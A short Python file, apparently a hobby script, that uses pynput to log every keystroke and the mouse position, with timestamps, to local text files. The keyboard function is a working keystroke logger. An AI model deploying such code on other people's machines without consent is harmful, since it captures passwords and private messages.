from pynput.keyboard import Key, Listener
from pynput.mouse import Controller
import logging


def keyboard_logger():
    '''Opens a text file and dumps key logs in it
    until the function exits
    '''
    log_dir = "files/"
    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()


def mouse_pos():
    '''Opens a text file and dumps mouse data in it
        until the function exits
    '''

    log_dir = "files/"
    logging.basicConfig(filename=(log_dir + "mouse_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    mouse = Controller()
    while True:
        logging.info(str(mouse.position))